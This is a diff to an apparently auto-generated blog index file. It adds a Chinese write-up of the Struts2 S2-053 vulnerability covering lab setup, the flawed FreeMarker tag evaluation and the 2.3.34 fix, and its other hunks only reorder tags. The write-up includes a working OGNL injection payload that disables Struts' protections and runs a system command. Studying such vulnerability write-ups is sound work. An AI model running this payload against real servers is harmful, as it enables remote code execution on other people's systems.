@@ -4,6 +4,25 @@
   
   
   <entry>
+    <title>struts2系列漏洞 S2-053</title>
+    <link href="/2020/08/03/struts2%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E-S2-053/"/>
+    <url>/2020/08/03/struts2%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E-S2-053/</url>
+    
+    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>  经典 Java 软件漏洞 struts 系列，准备一个个看过去。</p><a id="more"></a><hr><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>2.3.32 版本 struts2 + Tomcat 9。</p><p>修改 result type：</p><pre><code class="xml">&lt;result name=&quot;success&quot; type=&quot;freemarker&quot;&gt;/success.ftl&lt;/result&gt;</code></pre><p>新建一个 success.ftl 模板文件，然后加上 Freemaker tags：</p><pre><code class="html">&lt;@s.hidden name=&quot;redirectUri&quot; value=redirectUri /&gt;&lt;@s.hidden name=&quot;redirectUri&quot; value=&quot;${redirectUri}&quot; /&gt;&lt;@s.hidden name=&quot;${redirectUri}&quot;/&gt;</code></pre><p>三选一。</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>简单的双重评估漏洞，直接用 S2-046 的 payload：</p><pre><code>%25{(#container=#context[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.excludedClasses.clear()).(#ognlUtil.excludedPackageNames.clear()).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec(&#39;calc&#39;))}</code></pre><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>给 OGNL 的 callStaticMethod 函数下断点来找触发点，源头是在渲染标签属性的 evaluateParams 函数中，这里会调用 findString 解析表达式：</p><pre><code class="java">if (this.name != null) {    name = findString(this.name);    addParameter(&quot;name&quot;, name);}</code></pre><p>而这里的 name 已经经过了一次表达式解析，在前面 Freemaker 处理模板 element 的 accept 函数中：</p><pre><code class="java">args = new HashMap();for (Iterator it = namedArgs.entrySet().iterator(); it.hasNext();) {    Map.Entry entry = (Map.Entry) it.next();    String key = (String) entry.getKey();    Expression valueExp = (Expression) entry.getValue();    TemplateModel value = valueExp.eval(env);    args.put(key, value);}</code></pre><p>所以就导致了漏洞。</p><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>2.3.34 版本中，禁止了通过 clear 清空黑名单。</p><hr><p>参考文章：</p><p><a href="https://www.freebuf.com/vuls/147735.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/147735.html</a></p>]]></content>
+    
+    
+    
+    <tags>
+      
+      <tag>Web</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>struts2系列漏洞 S2-046</title>
     <link href="/2020/08/02/struts2%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E-S2-046/"/>
     <url>/2020/08/02/struts2%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E-S2-046/</url>
@@ -744,9 +763,9 @@
     
     <tags>
       
-      <tag>Web</tag>
-      
       <tag>CTF</tag>
+      
+      <tag>Web</tag>
       
     </tags>
     
@@ -845,9 +864,9 @@
     
     <tags>
       
-      <tag>Web</tag>
-      
       <tag>CTF</tag>
+      
+      <tag>Web</tag>
       
     </tags>
     
@@ -866,9 +885,9 @@
     
     <tags>
       
-      <tag>Web</tag>
-      
       <tag>CTF</tag>
+      
+      <tag>Web</tag>
       
     </tags>
     
@@ -887,9 +906,9 @@
     
     <tags>
       
-      <tag>Web</tag>
-      
       <tag>CTF</tag>
+      
+      <tag>Web</tag>
       
     </tags>
     
@@ -973,9 +992,9 @@
     
     <tags>
       
-      <tag>Web</tag>
-      
       <tag>CTF</tag>
+      
+      <tag>Web</tag>
       
     </tags>
     
@@ -994,9 +1013,9 @@
     
     <tags>
       
-      <tag>Web</tag>
-      
       <tag>CTF</tag>
+      
+      <tag>Web</tag>
       
     </tags>
     
@@ -1015,9 +1034,9 @@
     
     <tags>
       
-      <tag>Web</tag>
-      
       <tag>CTF</tag>
+      
+      <tag>Web</tag>
       
     </tags>
     
@@ -1036,9 +1055,9 @@
     
     <tags>
       
-      <tag>Web</tag>
-      
       <tag>CTF</tag>
+      
+      <tag>Web</tag>
       
       <tag>复现</tag>
       
@@ -1118,9 +1137,9 @@
     
     <tags>
       
-      <tag>Web</tag>
-      
       <tag>CTF</tag>
+      
+      <tag>Web</tag>
       
     </tags>
     
@@ -1179,9 +1198,9 @@
     
     <tags>
       
-      <tag>Web</tag>
-      
       <tag>CTF</tag>
+      
+      <tag>Web</tag>
       
       <tag>复现</tag>
       
@@ -1202,9 +1221,9 @@
     
     <tags>
       
-      <tag>Web</tag>
-      
       <tag>CTF</tag>
+      
+      <tag>Web</tag>
       
     </tags>
     
@@ -1223,9 +1242,9 @@
     
     <tags>
       
-      <tag>Web</tag>
-      
       <tag>CTF</tag>
+      
+      <tag>Web</tag>
       
     </tags>
     
@@ -1263,9 +1282,9 @@
     
     <tags>
       
-      <tag>Web</tag>
-      
       <tag>CTF</tag>
+      
+      <tag>Web</tag>
       
     </tags>
     
@@ -1345,9 +1364,9 @@
     
     <tags>
       
-      <tag>Web</tag>
-      
       <tag>CTF</tag>
+      
+      <tag>Web</tag>
       
     </tags>
     
@@ -1549,9 +1568,9 @@
     
     <tags>
       
-      <tag>Web</tag>
-      
       <tag>CTF</tag>
+      
+      <tag>Web</tag>
       
     </tags>
     
